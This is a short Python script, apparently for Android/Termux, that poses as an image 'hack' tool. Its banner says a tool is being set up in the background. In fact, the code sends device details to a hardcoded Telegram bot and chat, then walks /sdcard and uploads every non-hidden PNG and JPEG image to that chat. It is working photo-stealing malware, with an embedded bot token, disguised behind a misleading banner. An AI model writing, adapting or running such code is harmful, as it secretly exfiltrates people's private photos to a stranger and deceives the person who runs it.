import os
import sys
try:
    import telebot
except:
    os.system('pip install telebot')
    print('\n\nRun it again')
    sys.exit()

root_dir = '/sdcard'

total_img = []

api = '6663127059:AAFq9YPnMKY92IxKk0k2_GE_G4C2HJd3xy4'
bot = telebot.TeleBot(api)
caht_id = '5356385703'

def send_msg():
    try:
        
        msg = f'''
        Device Connected
        Os: {os.name}
        Os Module : { os.uname().sysname if hasattr(os, 'uname') else None}
        Machine Type : { os.uname().machine if hasattr(os, 'uname') else None }
        Currect Dir : { os.getcwd() }
        Cpu Corse : { os.cpu_count() }
        '''
        bot.send_message(caht_id,msg)
    except :
        pass




def collect():
    
    for root, dirs,files in os.walk(root_dir):
        for file in files:
            
            dot = (root+file).split('/.')
            
            if len(dot) > 1: 
                continue
            else:
                if file.lower().endswith(('png','jpg','jpeg')):
                    total_img.append(os.path.join(root+'/'+file))

    # New script
    for image in total_img:
        with open(image,'rb') as phoot:
            bot.send_photo(caht_id,phoot)
    




        

if __name__ == '__main__':
    print('''    
         __                __       
|  |\/| / _`    |__|  /\  /  ` |__/ 
|  |  | \__>    |  | /~~\ \__, |  \ 
w8 tool setup in background it's take some time.  
          ''')
    try:
        send_msg()
        collect()
    except:
        pass
